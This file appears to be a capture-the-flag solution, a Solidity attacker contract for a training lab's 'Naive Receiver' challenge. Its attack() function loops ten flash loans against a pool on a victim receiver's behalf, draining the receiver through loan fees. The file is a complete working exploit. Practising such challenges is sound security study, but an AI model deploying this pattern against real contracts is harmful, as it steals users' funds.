// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/interfaces/IERC3156FlashLender.sol";
import "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";

contract NaiveReceiverAttacker {
    IERC3156FlashLender public pool;
    IERC3156FlashBorrower public receiver;

    address private constant ETH = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;

    constructor(address _pool, address _receiver) {
        pool = IERC3156FlashLender(_pool);
        receiver = IERC3156FlashBorrower(_receiver);
    }

    function attack() external {
        for (uint256 i = 0; i < 10; i++) {
            pool.flashLoan(receiver, ETH, 100 ether, "0x");
        }
    }
}